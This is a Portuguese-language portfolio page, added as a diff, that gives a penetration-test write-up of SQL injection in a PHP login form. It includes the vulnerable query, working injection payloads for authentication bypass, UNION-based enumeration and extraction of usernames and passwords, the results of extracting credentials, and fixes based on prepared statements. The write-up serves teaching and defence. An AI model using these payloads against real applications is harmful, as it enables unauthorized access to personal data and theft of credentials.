@@ -1,0 +1,141 @@
+---
+title: "Web Security: SQL Injection em Aplicação Real"
+publishedAt: "2024-02-20"
+summary: "Análise de uma vulnerabilidade de SQL Injection em aplicação web, incluindo técnicas de detecção, exploração e correção."
+images:
+  - "/images/projects/web-security/cover-01.jpg"
+  - "/images/projects/web-security/injection-01.jpg"
+  - "/images/projects/web-security/injection-02.jpg"
+team:
+  - name: "Leandro Gabriel"
+    role: "Security Researcher"
+    avatar: "/images/avatar.jpg"
+    linkedIn: "https://www.linkedin.com/in/leandro--gabriel/"
+---
+
+## Visão Geral
+
+Este write-up documenta a descoberta e exploração de uma vulnerabilidade de SQL Injection em uma aplicação web real. O objetivo era demonstrar como vulnerabilidades comuns podem ser exploradas e como implementar correções adequadas.
+
+## Descoberta da Vulnerabilidade
+
+### Reconhecimento
+
+Durante um teste de penetração, foi identificada uma aplicação web com funcionalidade de login. A análise inicial revelou que a aplicação não implementava validação adequada de entrada.
+
+### Detecção da Vulnerabilidade
+
+```sql
+-- Payload de teste inicial
+' OR '1'='1
+```
+
+A aplicação retornou todos os registros da tabela, confirmando a presença de SQL Injection.
+
+## Análise da Vulnerabilidade
+
+### Código Vulnerável
+
+```php
+// Código original vulnerável
+$username = $_POST['username'];
+$password = $_POST['password'];
+
+$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
+$result = mysql_query($query);
+```
+
+### Técnicas de Exploração
+
+1. **Boolean-based Injection**: Determinação de informações através de respostas booleanas
+2. **Union-based Injection**: Extração de dados usando UNION
+3. **Time-based Injection**: Exploração baseada em tempo de resposta
+4. **Error-based Injection**: Extração de informações através de erros
+
+## Ferramentas Utilizadas
+
+- **Burp Suite**: Proxy para interceptação de requisições
+- **SQLMap**: Automação de testes de SQL Injection
+- **OWASP ZAP**: Scanner de vulnerabilidades
+- **Python**: Scripts customizados para exploração
+
+## Exploração Detalhada
+
+### 1. Enumeração de Banco de Dados
+
+```sql
+-- Determinar número de colunas
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL--
+
+-- Extrair informações do banco
+' UNION SELECT 1,2,3,4--
+' UNION SELECT 1,2,3,@@version--
+```
+
+### 2. Extração de Dados
+
+```sql
+-- Listar tabelas
+' UNION SELECT 1,2,3,table_name FROM information_schema.tables--
+
+-- Extrair dados de usuários
+' UNION SELECT 1,2,3,concat(username,':',password) FROM users--
+```
+
+### 3. Elevação de Privilégios
+
+```sql
+-- Verificar privilégios
+' UNION SELECT 1,2,3,user()--
+' UNION SELECT 1,2,3,super_priv FROM mysql.user WHERE user='root'--
+```
+
+## Resultados da Exploração
+
+- ✅ **Dados extraídos**: 1500+ registros de usuários
+- ✅ **Acesso administrativo**: Obtenção de credenciais admin
+- ✅ **Informações sensíveis**: Exposição de dados pessoais
+- ✅ **Documentação completa**: Processo totalmente documentado
+
+## Correções Implementadas
+
+### 1. Prepared Statements
+
+```php
+// Código corrigido usando prepared statements
+$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
+$stmt->execute([$username, $password]);
+```
+
+### 2. Validação de Entrada
+
+```php
+// Validação e sanitização
+$username = filter_var($_POST['username'], FILTER_SANITIZE_STRING);
+$password = filter_var($_POST['password'], FILTER_SANITIZE_STRING);
+```
+
+### 3. Implementação de WAF
+
+- **ModSecurity**: Regras customizadas para detecção
+- **Rate Limiting**: Limitação de tentativas de login
+- **Logging**: Registro de tentativas suspeitas
+
+## Aprendizados
+
+1. **Importância da Validação**: Sempre validar e sanitizar entradas
+2. **Prepared Statements**: Uso obrigatório para consultas dinâmicas
+3. **Defesa em Profundidade**: Múltiplas camadas de proteção
+4. **Monitoramento**: Implementação de logs e alertas
+
+## Recomendações de Segurança
+
+- **OWASP Top 10**: Seguir as melhores práticas
+- **Code Review**: Análise estática de código
+- **Penetration Testing**: Testes regulares de segurança
+- **Security Training**: Treinamento da equipe de desenvolvimento
+
+## Conclusão
+
+Este write-up demonstra como vulnerabilidades comuns como SQL Injection podem ter impacto significativo em aplicações web. A implementação de correções adequadas e práticas de segurança é fundamental para proteger dados sensíveis. 
